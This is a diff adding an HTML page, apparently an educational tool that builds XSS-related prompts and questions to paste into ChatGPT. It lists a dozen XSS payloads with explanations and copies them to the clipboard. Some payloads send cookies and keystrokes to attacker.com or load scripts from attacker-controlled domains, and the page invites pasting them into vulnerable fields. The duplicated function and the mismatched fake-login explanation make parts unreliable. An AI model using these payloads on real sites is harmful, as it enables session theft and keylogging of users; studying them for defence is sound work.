@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS Injections</title>
+  <style>
+    .sentence {
+      margin-bottom: 10px;
+    }
+  </style>
+  <script>
+    const hints = [
+      "Research and explain the various types of XSS vulnerabilities, such as reflected XSS, stored XSS, and DOM-based XSS.",
+      "Discuss how these vulnerabilities can be exploited and the potential consequences.",
+      "Suggest preventive measures to mitigate XSS risks."
+    ];
+
+    const questions = [
+      "Can you provide some examples of XSS payloads used to demonstrate the impact of Cross-Site Scripting attacks?",
+      "What are the potential consequences of executing these XSS payloads on a vulnerable website?",
+      "Explain the steps involved in crafting a persistent XSS attack.",
+      "Could you provide an example of a real-world application that was affected by a persistent XSS vulnerability?",
+      "Discuss the various methods used by attackers to deliver an XSS payload to unsuspecting users.",
+      "Can you provide an example of a social engineering technique used to trick users into clicking on a malicious link?",
+      "Explain how input validation and output encoding can mitigate the risk of XSS attacks.",
+      "What are some common mistakes developers make when implementing input validation or output encoding?",
+      "Describe a scenario where an XSS vulnerability was successfully exploited to steal sensitive information.",
+      "What countermeasures could have been implemented to prevent such an attack?"
+    ];
+
+    const xssExamples = [
+      {
+        payload: '&lt;script&gt;alert(\'XSS\')&lt;/script&gt;',
+        explanation: "This payload triggers an alert popup with the message 'XSS' when the page is loaded."
+      },
+      {
+        payload: '&lt;script&gt;\ndocument.location = \'https://attacker.com/steal.php?cookie=\' + document.cookie\n&lt;/script&gt;',
+        explanation: "This payload redirects the user to a malicious site while also sending their cookie data to the attacker's server."
+      },
+      {
+        payload: '&lt;script&gt;\ndocument.onkeydown = function(e) {\n  var key = String.fromCharCode(e.keyCode);\n  new Image().src = \'https://attacker.com/collect.php?key=\' + key;\n}\n&lt;/script&gt;',
+        explanation: "This payload logs every key pressed by the user and sends it to the attacker's server."
+      },
+      {
+        payload: '&lt;script src="https://attacker.com/malicious.js"&gt;&lt;/script&gt;',
+        explanation: "This payload includes an external JavaScript file hosted on an attacker-controlled domain, allowing arbitrary code execution on the victim's browser."
+      },
+      {
+        payload: '&lt;img src="https://attacker.com/malicious-image" onerror="alert(\'XSS\')"&gt;',
+        explanation: "This payload injects an image tag with a source that triggers an error, executing the onerror event and displaying an XSS alert."
+      },
+      {
+        payload: '&lt;form action="https://target.com/login" method="POST" onsubmit="return false;"&gt;&lt;input type=\'hidden\' name=\'username\' value=\'attacker\'&gt;&lt;input type=\'hidden\' name=\'password\' value=\'password\'&gt;&lt;input type=\'submit\' value=\'Login\'&gt;&lt;/form&gt;',
+        explanation: "This payload creates a fake login form that captures the username and password entered by the victim, preventing them from logging in securely."
+      },
+      {
+        payload: '&lt;script&gt;\ndocument.getElementById(\'output\').innerHTML = document.location.hash.substring(1)\n&lt;/script&gt;',
+        explanation: "This payload extracts the value from the URL fragment identifier (hash) and injects it into an HTML element with the ID 'output', potentially leading to DOM-based XSS vulnerabilities."
+      },
+      {
+        payload: '&lt;script&gt;alert(123)&lt;/script&gt;',
+        explanation: "This payload triggers an alert popup with the message '123' when the page is loaded."
+      },
+      {
+        payload: '&lt;script src="https://mallorysevilsite.com/authstealer.js"&gt;&lt;/script&gt;',
+        explanation: "This payload includes an external JavaScript file from a malicious site, potentially stealing sensitive information or performing unauthorized actions."
+      },
+      {
+        payload: '&lt;BODY ONLOAD=\'javascript:alert("XSS")\'&gt;',
+        explanation: "This payload triggers an alert with the message 'XSS' when the page finishes loading."
+      },
+      {
+        payload: '&lt;iframe width=\'560\' height=\'315\' src=\'https://www.youtube.com/embed/dQw4w9WgXcQ\' frameborder=\'0\' allowfullscreen&gt;&lt;/iframe&gt;',
+        explanation: "This payload embeds a YouTube video with the infamous 'Rickroll' video, redirecting unsuspecting users to Rick Astley's music video."
+      },
+      {
+        payload: '&lt;BODY ONLOAD=\'javascript:window.location="http://www.google.com"\' &gt;',
+        explanation: "This payload redirects the user's browser to the Google homepage as soon as the page loads."
+      }
+    ];
+
+    let prompt = "";
+
+    function displayHint(index) {
+      prompt += hints[index] + " ";
+      document.getElementById("prompt").textContent = prompt;
+    }
+
+    function reset() {
+      prompt = "";
+      document.getElementById("prompt").textContent = "";
+    }
+
+    function copyPrompt() {
+      const textarea = document.createElement("textarea");
+      textarea.value = prompt;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textarea);
+      alert("Prompt copied to clipboard. You can now paste it into the chatbox for ChatGPT and begin a new conversation.");
+      openChatGPT(prompt);
+    }
+
+    function openChatGPT(prompt) {
+      const chatURL = "https://chat.openai.com/";
+      const newTab = window.open(chatURL, "_blank");
+      newTab.onload = function () {
+        const chatInput = newTab.document.querySelector('input[placeholder="Type your message here"]');
+        chatInput.value = prompt;
+        chatInput.dispatchEvent(new Event("input", { bubbles: true }));
+      };
+    }
+
+    function copyQuestionAndAsk(question) {
+      const textarea = document.createElement("textarea");
+      textarea.value = question;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textarea);
+      alert(`Question copied to clipboard. You can now paste it into your existing ChatGPT conversation and see what information it returns: "${question}"`);
+    }
+
+    let currentXSSExampleIndex = 0;
+
+    function copyXSSExample(index) {
+      const example = xssExamples[index];
+      const textarea = document.createElement("textarea");
+      textarea.value = renderPayload(example.payload);
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textarea);
+      alert(`XSS Example ${index + 1} copied to clipboard: ${renderPayload(example.payload)}`);
+    }
+
+    function provideXSSExamples() {
+      if (currentXSSExampleIndex < xssExamples.length) {
+        const xssExample = xssExamples[currentXSSExampleIndex];
+        const table = document.getElementById("xss-examples-table");
+        const row = table.insertRow();
+
+        const payloadCell = row.insertCell();
+        const explanationCell = row.insertCell();
+
+        payloadCell.innerHTML = renderPayload(xssExample.payload);
+        explanationCell.textContent = xssExample.explanation;
+
+        const query = renderPayload(xssExample.payload);
+        const textarea = document.createElement("textarea");
+        textarea.value = query;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand("copy");
+        document.body.removeChild(textarea);
+        alert(`XSS Example query copied to clipboard: ${query}`);
+
+        currentXSSExampleIndex++;
+      } else {
+        alert("You have reached the end of the XSS injection examples.");
+      }
+    }
+
+
+function provideXSSExamples() {
+  if (currentXSSExampleIndex < xssExamples.length) {
+    const xssExample = xssExamples[currentXSSExampleIndex];
+    const table = document.getElementById("xss-examples-table");
+    const row = table.insertRow();
+
+    const payloadCell = row.insertCell();
+    const explanationCell = row.insertCell();
+
+    const payload = renderPayload(xssExample.payload);
+
+    payloadCell.textContent = payload;
+    explanationCell.textContent = xssExample.explanation;
+
+    const query = xssExample.payload;
+    const textarea = document.createElement("textarea");
+    textarea.value = query;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+    document.body.removeChild(textarea);
+    alert(`XSS Example payload copied to clipboard:\n\n${payload}`);
+
+    currentXSSExampleIndex++;
+  } else {
+    alert("You have reached the end of the XSS injection examples.");
+  }
+}
+
+
+
+    function renderPayload(payload) {
+      const textarea = document.createElement("textarea");
+      textarea.innerHTML = payload;
+      return textarea.value;
+    }
+  </script>
+</head>
+<body>
+    <div class="sentence">
+    <h2>How to Use the Prompt Sentence Viewer:</h2>
+    <ol>
+      <li>Click on the numbered buttons to reveal each sentence of the prompt. Each click displays an additional sentence.</li>
+      <li>Once all the sentences are revealed, the entire prompt will be displayed.</li>
+      <li>Click the "Copy Prompt" button to copy the entire prompt to your clipboard. You can now paste the prompt into the opened tab of the ChatGPT application.</li>
+    </ol>
+  </div>
+    <h1>Prompt Sentence Viewer</h1>
+    <div class="sentence">
+      <button onclick="displayHint(0)">Hint 1</button>
+      <button onclick="displayHint(1)">Hint 2</button>
+      <button onclick="displayHint(2)">Hint 3</button>
+    </div>
+    <div class="sentence">
+      <button onclick="copyPrompt()">Copy Prompt</button>
+    </div>
+    <div class="sentence">
+      <h2>Prompt:</h2>
+      <p id="prompt"></p>
+    </div>
+<!--     <div class="sentence">
+      <button onclick="reset()">Reset</button>
+    </div> -->
+      <div class="sentence">
+    <h2>If you are stuck and need ideas for questions, follow these steps:</h2>
+    <ol>
+      <li>Click on the pre-defined question buttons.</li>
+      <li>The selected question will be copied to your clipboard.</li>
+      <li>Paste the copied question into your existing ChatGPT conversation to see what information it returns.</li>
+    </ol>
+  </div>
+    <div class="sentence">
+      <ul>
+        <li><button onclick="copyQuestionAndAsk(questions[0])">Question 1</button></li>
+        <li><button onclick="copyQuestionAndAsk(questions[1])">Question 2</button></li>
+        <li><button onclick="copyQuestionAndAsk(questions[2])">Question 3</button></li>
+        <li><button onclick="copyQuestionAndAsk(questions[3])">Question 4</button></li>
+        <li><button onclick="copyQuestionAndAsk(questions[4])">Question 5</button></li>
+        <li><button onclick="copyQuestionAndAsk(questions[5])">Question 6</button></li>
+        <li><button onclick="copyQuestionAndAsk(questions[6])">Question 7</button></li>
+        <li><button onclick="copyQuestionAndAsk(questions[7])">Question 8</button></li>
+        <li><button onclick="copyQuestionAndAsk(questions[8])">Question 9</button></li>
+        <li><button onclick="copyQuestionAndAsk(questions[9])">Question 10</button></li>
+      </ul>
+    </div>
+    <div class="sentence">
+    <h2>Instructions for XSS Injection Examples:</h2>
+    <ol>
+      <li>Click the "Generate XSS Injection Examples" button to view the XSS injection examples.</li>
+      <li>The examples will be displayed in the table below.</li>
+      <li>Each example consists of an XSS injection and an explanation.</li>
+      <li>Clicking the "Generate XSS Injection Examples" button again will display the next example, if available.</li>
+      <li>The XSS injection payload will be copied to your clipboard automatically.</li>
+      <li>Paste the copied payload into a vulnerable input field or an HTML context to see the effect of the injection.</li>
+    </ol>
+<div class="sentence">
+  <h2>XSS Examples:</h2>
+  <table id="xss-examples-table">
+    <tr>
+      <th>Payload</th>
+      <th>Explanation</th>
+    </tr>
+  </table>
+  <button onclick="provideXSSExamples()">Generate XSS Examples</button>
+</div>
+</body>
+</html>
